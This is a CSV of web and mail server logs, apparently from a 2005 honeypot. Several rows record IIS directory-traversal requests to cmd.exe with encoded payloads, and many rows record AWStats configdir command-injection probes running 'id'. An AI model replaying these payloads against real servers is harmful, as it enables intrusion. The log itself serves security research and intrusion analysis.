,Epoch Date,Log Type,IP Adress,Log
213,1110809437,access_log,67.170.0.153," ""GET /MSADC/root.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
214,1110809437,access_log,67.170.0.153," ""GET /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
215,1110809437,access_log,67.170.0.153," ""GET /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
216,1110809437,error_log,67.170.0.153,"[error] File does not exist: /var/www/html/MSADC
"
217,1110809437,error_log,67.170.0.153,"[error] File does not exist: /var/www/html/c
"
218,1110809437,error_log,67.170.0.153,"[error] File does not exist: /var/www/html/d
"
219,1110809438,access_log,67.170.0.153," ""GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
220,1110809438,error_log,67.170.0.153,"[error] File does not exist: /var/www/html/scripts
"
221,1110809441,access_log,67.170.0.153," ""GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
222,1110809441,error_log,67.170.0.153,"[error] File does not exist: /var/www/html/_vti_bin
"
223,1110809442,access_log,67.170.0.153," ""GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
224,1110809442,access_log,67.170.0.153," ""GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
225,1110809442,error_log,67.170.0.153,"[error] File does not exist: /var/www/html/_mem_bin
"
226,1110809442,error_log,67.170.0.153,"[error] File does not exist: /var/www/html/msadc
"
227,1110809443,access_log,67.170.0.153," ""GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
228,1110809443,access_log,67.170.0.153," ""GET /scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
229,1110809443,access_log,67.170.0.153," ""GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
230,1110809443,error_log,67.170.0.153,"[error] File does not exist: /var/www/html/scripts
"
231,1110809443,error_log,67.170.0.153,"[error] File does not exist: /var/www/html/scripts
"
232,1110809444,access_log,67.170.0.153," ""GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
233,1110809444,access_log,67.170.0.153," ""GET /scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 400 974 ""-"" ""-"""
234,1110809444,access_log,67.170.0.153," ""GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 400 974 ""-"" ""-"""
235,1110809444,access_log,67.170.0.153," ""GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
236,1110809444,error_log,67.170.0.153,"[error] File does not exist: /var/www/html/scripts
"
237,1110809444,error_log,67.170.0.153,"[error] File does not exist: /var/www/html/scripts
"
238,1110809445,access_log,67.170.0.153," ""GET /scripts/..%252f../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
239,1110809445,error_log,67.170.0.153,"[error] File does not exist: /var/www/html/scripts
"
240,1110813217,access_log,222.166.160.3," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
241,1110813217,error_log,222.166.160.3,"[error] Directory index forbidden by rule: /var/www/html/
"
242,1110816072,access_log,61.10.7.140," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
243,1110816072,error_log,61.10.7.140,"[error] Directory index forbidden by rule: /var/www/html/
"
244,1110819867,access_log,61.232.252.176," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
245,1110819867,error_log,61.232.252.176,"[error] Directory index forbidden by rule: /var/www/html/
"
246,1110836931,access_log,219.133.25.250," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
247,1110836931,error_log,219.133.25.250,"[error] Directory index forbidden by rule: /var/www/html/
"
248,1110837042,access_log,139.68.4.4," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
249,1110837042,error_log,139.68.4.4,"[error] Directory index forbidden by rule: /var/www/html/
"
250,1110839736,access_log,204.102.106.103," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
251,1110839736,error_log,204.102.106.103,"[error] Directory index forbidden by rule: /var/www/html/
"
252,1110844066,mail_log,211.158.69.89,combo sendmail[12661]: j2F4lk6S012661: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
253,1110844066,mail_log,211.158.69.89,combo sendmail[12651]: j2F4lk6S012651: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
254,1110844066,mail_log,211.158.69.89,combo sendmail[12652]: j2F4lk6S012652: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
255,1110844066,mail_log,211.158.69.89,combo sendmail[12656]: j2F4lk6S012656: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
256,1110844066,mail_log,211.158.69.89,combo sendmail[12662]: j2F4lk6S012662: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
257,1110844066,mail_log,211.158.69.89,combo sendmail[12644]: j2F4lk6S012644: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
258,1110844066,mail_log,211.158.69.89,combo sendmail[12653]: j2F4lk6S012653: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
259,1110844066,mail_log,211.158.69.89,combo sendmail[12659]: j2F4lk6S012659: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
260,1110844066,mail_log,211.158.69.89,combo sendmail[12650]: j2F4lk6S012650: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
261,1110844066,mail_log,211.158.69.89,combo sendmail[12649]: j2F4lk6S012649: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
262,1110844066,mail_log,211.158.69.89,combo sendmail[12643]: j2F4lk6S012643: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
263,1110844066,mail_log,211.158.69.89,combo sendmail[12645]: j2F4lk6S012645: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
264,1110844066,mail_log,211.158.69.89,combo sendmail[12646]: j2F4lk6S012646: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
265,1110844066,mail_log,211.158.69.89,combo sendmail[12648]: j2F4lk6S012648: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
266,1110844066,mail_log,211.158.69.89,combo sendmail[12658]: j2F4lk6S012658: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
267,1110844066,mail_log,211.158.69.89,combo sendmail[12657]: j2F4lk6S012657: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
268,1110844066,mail_log,211.158.69.89,combo sendmail[12647]: j2F4lk6S012647: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
269,1110844066,mail_log,211.158.69.89,combo sendmail[12660]: j2F4lk6S012660: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
270,1110844066,mail_log,211.158.69.89,combo sendmail[12654]: j2F4lk6S012654: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
271,1110844066,mail_log,211.158.69.89,combo sendmail[12655]: j2F4lk6S012655: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
272,1110844066,mail_log,211.158.69.89,combo sendmail[12663]: j2F4lk6S012663: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
273,1110844066,mail_log,211.158.69.89,combo sendmail[12664]: j2F4lk6S012664: [211.158.69.89] did not issue MAIL/EXPN/VRFY/ETRN during connection to MTA
274,1110849888,access_log,61.10.7.68," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
275,1110849888,error_log,61.10.7.68,"[error] Directory index forbidden by rule: /var/www/html/
"
276,1110850112,access_log,67.136.86.162," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
277,1110850112,error_log,67.136.86.162,"[error] Directory index forbidden by rule: /var/www/html/
"
278,1110851183,access_log,157.91.48.191," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
279,1110851183,error_log,157.91.48.191,"[error] Directory index forbidden by rule: /var/www/html/
"
280,1110856839,access_log,67.154.159.190," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
281,1110856839,error_log,67.154.159.190,"[error] Directory index forbidden by rule: /var/www/html/
"
282,1110859452,mail_log,-,"combo sendmail[13333]: j2F94C4d013333: from=root, size=1145, class=0, nrcpts=1, msgid=<200503150904.j2F94C4d013333@combo.honeypotbox.com>, relay=root@localhost"
283,1110859476,mail_log,127.0.0.1,"combo sendmail[13336]: j2F94C6S013336: from=<root@combo.honeypotbox.com>, size=1459, class=0, nrcpts=1, msgid=<200503150904.j2F94C4d013333@combo.honeypotbox.com>, proto=ESMTP, daemon=MTA, relay=localhost.localdomain [127.0.0.1]"
284,1110859476,mail_log,127.0.0.1,"combo sendmail[13333]: j2F94C4d013333: to=root, ctladdr=root (0/0), delay=00:00:24, xdelay=00:00:24, mailer=relay, pri=30056, relay=[127.0.0.1] [127.0.0.1], dsn=2.0.0, stat=Sent (j2F94C6S013336 Message accepted for delivery)"
285,1110859476,mail_log,-,"combo sendmail[13337]: j2F94C6S013336: to=<root@combo.honeypotbox.com>, ctladdr=<root@combo.honeypotbox.com> (0/0), delay=00:00:00, xdelay=00:00:00, mailer=local, pri=31702, dsn=2.0.0, stat=Sent"
286,1110860148,mail_log,-,"combo sendmail[13548]: j2F9Ei14013548: from=root, size=39406, class=0, nrcpts=1, msgid=<200503150914.j2F9Ei14013548@combo.honeypotbox.com>, relay=root@localhost"
287,1110860165,mail_log,127.0.0.1,"combo sendmail[13555]: j2F9Fm6S013555: from=<root@combo.honeypotbox.com>, size=39702, class=0, nrcpts=1, msgid=<200503150914.j2F9Ei14013548@combo.honeypotbox.com>, proto=ESMTP, daemon=MTA, relay=localhost.localdomain [127.0.0.1]"
288,1110860165,mail_log,127.0.0.1,"combo sendmail[13548]: j2F9Ei14013548: to=root, ctladdr=root (0/0), delay=00:01:20, xdelay=00:00:17, mailer=relay, pri=30241, relay=[127.0.0.1] [127.0.0.1], dsn=2.0.0, stat=Sent (j2F9Fm6S013555 Message accepted for delivery)"
289,1110860165,mail_log,-,"combo sendmail[13556]: j2F9Fm6S013555: to=<root@combo.honeypotbox.com>, ctladdr=<root@combo.honeypotbox.com> (0/0), delay=00:00:00, xdelay=00:00:00, mailer=local, pri=69940, dsn=2.0.0, stat=Sent"
290,1110863209,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
291,1110863209,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
292,1110863210,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
293,1110863210,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
294,1110863210,error_log,81.181.146.13,"[error] script not found or unable to stat: /var/www/cgi-bin/awstats
"
295,1110863210,error_log,81.181.146.13,"[error] script not found or unable to stat: /var/www/cgi-bin/awstats
"
296,1110863210,error_log,81.181.146.13,"[error] script not found or unable to stat: /var/www/cgi-bin/awstats
"
297,1110863210,error_log,81.181.146.13,"[error] script not found or unable to stat: /var/www/cgi-bin/awstats
"
298,1110863211,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
299,1110863211,error_log,81.181.146.13,"[error] script not found or unable to stat: /var/www/cgi-bin/awstats
"
300,1110863212,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1051 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
301,1110863212,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
302,1110863212,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
303,1110863212,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
304,1110863212,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1051 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
305,1110863212,access_log,81.181.146.13," ""GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 500 1097 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
306,1110863212,access_log,81.181.146.13," ""GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 500 1097 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
307,1110863212,access_log,81.181.146.13," ""GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 500 1097 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
308,1110863212,error_log,81.181.146.13,"[error] script not found or unable to stat: /var/www/cgi-bin/awstats
"
309,1110863212,error_log,81.181.146.13,"[error] script not found or unable to stat: /var/www/cgi-bin/awstats
"
310,1110863212,error_log,81.181.146.13,"[error] script not found or unable to stat: /var/www/cgi-bin/awstats
"
311,1110863212,error_log,81.181.146.13,"[error] script not found or unable to stat: /var/www/cgi-bin/awstats
"
312,1110863213,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
313,1110863213,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1051 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
314,1110863213,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1051 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
315,1110863213,access_log,81.181.146.13," ""GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 500 1097 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
316,1110863213,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1051 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
317,1110863213,access_log,81.181.146.13," ""GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 500 1097 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
318,1110863213,error_log,81.181.146.13,"[error] script not found or unable to stat: /var/www/cgi-bin/awstats
"
319,1110863213,error_log,81.181.146.13,"[error] script not found or unable to stat: /var/www/cgi-bin/awstats
"
320,1110863213,error_log,81.181.146.13,"[error] script not found or unable to stat: /var/www/cgi-bin/awstats
"
321,1110863213,error_log,81.181.146.13,"[error] Premature end of script headers: awstats.pl
"
322,1110863213,error_log,81.181.146.13,"[error] Premature end of script headers: awstats.pl
"
323,1110863213,error_log,81.181.146.13,"[error] Premature end of script headers: awstats.pl
"
324,1110863213,error_log,81.181.146.13,"[error] /usr/bin/perl: relocation error: /lib/tls/libpthread.so.0: symbol errno, version GLIBC_PRIVATE not defined in file libc.so.6 with link time reference
"
325,1110863213,error_log,81.181.146.13,"[error] /usr/bin/perl: relocation error: /lib/tls/libpthread.so.0: symbol errno, version GLIBC_PRIVATE not defined in file libc.so.6 with link time reference
"
326,1110863213,error_log,81.181.146.13,"[error] /usr/bin/perl: relocation error: /lib/tls/libpthread.so.0: symbol errno, version GLIBC_PRIVATE not defined in file libc.so.6 with link time reference
"
327,1110863213,error_log,81.181.146.13,"[error] script not found or unable to stat: /var/www/cgi-bin/awstats
"
328,1110863213,error_log,81.181.146.13,"[error] Premature end of script headers: awstats.pl
"
329,1110863213,error_log,81.181.146.13,"[error] /usr/bin/perl: relocation error: /lib/tls/libpthread.so.0: symbol errno, version GLIBC_PRIVATE not defined in file libc.so.6 with link time reference
"
330,1110863213,error_log,81.181.146.13,"[error] script not found or unable to stat: /var/www/cgi-bin/awstats
"
331,1110863213,error_log,81.181.146.13,"[error] Premature end of script headers: awstats.pl
"
332,1110863213,error_log,81.181.146.13,"[error] /usr/bin/perl: relocation error: /lib/tls/libpthread.so.0: symbol errno, version GLIBC_PRIVATE not defined in file libc.so.6 with link time reference
"
333,1110863214,access_log,81.181.146.13," ""GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 500 1098 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
334,1110863214,access_log,81.181.146.13," ""GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
335,1110863214,error_log,81.181.146.13,"[error] Premature end of script headers: awstats.pl
"
336,1110863214,error_log,81.181.146.13,"[error] /usr/bin/perl: relocation error: /lib/tls/libpthread.so.0: symbol errno, version GLIBC_PRIVATE not defined in file libc.so.6 with link time reference
"
337,1110863214,error_log,81.181.146.13,"[error] File does not exist: /var/www/html/cgi
"
338,1110863215,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
339,1110863215,access_log,81.181.146.13," ""GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
340,1110863215,access_log,81.181.146.13," ""GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 500 1098 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
341,1110863215,access_log,81.181.146.13," ""GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
342,1110863215,error_log,81.181.146.13,"[error] Directory index forbidden by rule: /var/www/html/
"
343,1110863215,error_log,81.181.146.13,"[error] File does not exist: /var/www/html/cgi
"
344,1110863215,error_log,81.181.146.13,"[error] Premature end of script headers: awstats.pl
"
345,1110863215,error_log,81.181.146.13,"[error] /usr/bin/perl: relocation error: /lib/tls/libpthread.so.0: symbol errno, version GLIBC_PRIVATE not defined in file libc.so.6 with link time reference
"
346,1110863215,error_log,81.181.146.13,"[error] File does not exist: /var/www/html/cgi
"
347,1110863216,access_log,81.181.146.13," ""GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 500 1097 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
348,1110863216,access_log,81.181.146.13," ""GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
349,1110863216,error_log,81.181.146.13,"[error] Premature end of script headers: awstats.pl
"
350,1110863216,error_log,81.181.146.13,"[error] /usr/bin/perl: relocation error: /lib/tls/libpthread.so.0: symbol errno, version GLIBC_PRIVATE not defined in file libc.so.6 with link time reference
"
351,1110863216,error_log,81.181.146.13,"[error] File does not exist: /var/www/html/cgi
"
352,1110863217,access_log,81.181.146.13," ""GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 500 1098 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
353,1110863217,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
354,1110863217,access_log,81.181.146.13," ""GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 500 1097 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
355,1110863217,error_log,81.181.146.13,"[error] Premature end of script headers: awstats.pl
"
356,1110863217,error_log,81.181.146.13,"[error] /usr/bin/perl: relocation error: /lib/tls/libpthread.so.0: symbol errno, version GLIBC_PRIVATE not defined in file libc.so.6 with link time reference
"
357,1110863217,error_log,81.181.146.13,"[error] Directory index forbidden by rule: /var/www/html/
"
358,1110863217,error_log,81.181.146.13,"[error] Premature end of script headers: awstats.pl
"
359,1110863217,error_log,81.181.146.13,"[error] /usr/bin/perl: relocation error: /lib/tls/libpthread.so.0: symbol errno, version GLIBC_PRIVATE not defined in file libc.so.6 with link time reference
"
360,1110863218,access_log,81.181.146.13," ""GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1051 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
361,1110863218,access_log,81.181.146.13," ""GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
362,1110863218,access_log,81.181.146.13," ""GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1051 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
363,1110863218,access_log,81.181.146.13," ""GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
364,1110863218,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
365,1110863218,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
366,1110863218,error_log,81.181.146.13,"[error] File does not exist: /var/www/html/cgi
"
367,1110863218,error_log,81.181.146.13,"[error] File does not exist: /var/www/html/cgi
"
368,1110863218,error_log,81.181.146.13,"[error] File does not exist: /var/www/html/cgi
"
369,1110863218,error_log,81.181.146.13,"[error] File does not exist: /var/www/html/cgi
"
370,1110863218,error_log,81.181.146.13,"[error] Directory index forbidden by rule: /var/www/html/
"
371,1110863218,error_log,81.181.146.13,"[error] Directory index forbidden by rule: /var/www/html/
"
372,1110863219,access_log,81.181.146.13," ""GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1051 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
373,1110863219,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
374,1110863219,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
375,1110863219,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
376,1110863219,access_log,81.181.146.13," ""GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
377,1110863219,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
378,1110863219,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
379,1110863219,error_log,81.181.146.13,"[error] File does not exist: /var/www/html/cgi
"
380,1110863219,error_log,81.181.146.13,"[error] Directory index forbidden by rule: /var/www/html/
"
381,1110863219,error_log,81.181.146.13,"[error] Directory index forbidden by rule: /var/www/html/
"
382,1110863219,error_log,81.181.146.13,"[error] Directory index forbidden by rule: /var/www/html/
"
383,1110863219,error_log,81.181.146.13,"[error] File does not exist: /var/www/html/cgi
"
384,1110863219,error_log,81.181.146.13,"[error] Directory index forbidden by rule: /var/www/html/
"
385,1110863219,error_log,81.181.146.13,"[error] Directory index forbidden by rule: /var/www/html/
"
386,1110863220,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
387,1110863220,access_log,81.181.146.13," ""GET //cgi-bin/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 500 1097 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
388,1110863220,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
389,1110863220,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
390,1110863220,access_log,81.181.146.13," ""GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
391,1110863220,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
392,1110863220,access_log,81.181.146.13," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
393,1110863220,access_log,81.181.146.13," ""GET //cgi/awstats.pl?configdir=|%20id%20| HTTP/1.1"" 404 1050 ""-"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"""
394,1110863220,error_log,81.181.146.13,"[error] Directory index forbidden by rule: /var/www/html/
"
395,1110863220,error_log,81.181.146.13,"[error] Premature end of script headers: awstats.pl
"
396,1110863220,error_log,81.181.146.13,"[error] /usr/bin/perl: relocation error: /lib/tls/libpthread.so.0: symbol errno, version GLIBC_PRIVATE not defined in file libc.so.6 with link time reference
"
